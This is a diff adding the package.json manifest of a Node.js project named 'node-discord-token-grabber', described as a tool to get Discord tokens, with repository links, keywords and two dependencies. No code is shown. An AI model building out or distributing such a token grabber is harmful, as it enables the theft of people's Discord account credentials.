@@ -1,0 +1,29 @@
+{
+  "name": "node-discord-token-grabber",
+  "version": "1.0.0",
+  "description": "Allows you to get the Discord tokens",
+  "main": "index.js",
+  "scripts": {
+    "test": "node index.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/dylandev-to/node-discord-token-grabber.git"
+  },
+  "keywords": [
+    "discord",
+    "token",
+    "grabber",
+    "node"
+  ],
+  "author": "dylandev-to",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/dylandev-to/node-discord-token-grabber/issues"
+  },
+  "homepage": "https://github.com/dylandev-to/node-discord-token-grabber#readme",
+  "dependencies": {
+    "crypto": "^1.0.1",
+    "win-protect": "^1.0.0"
+  }
+}
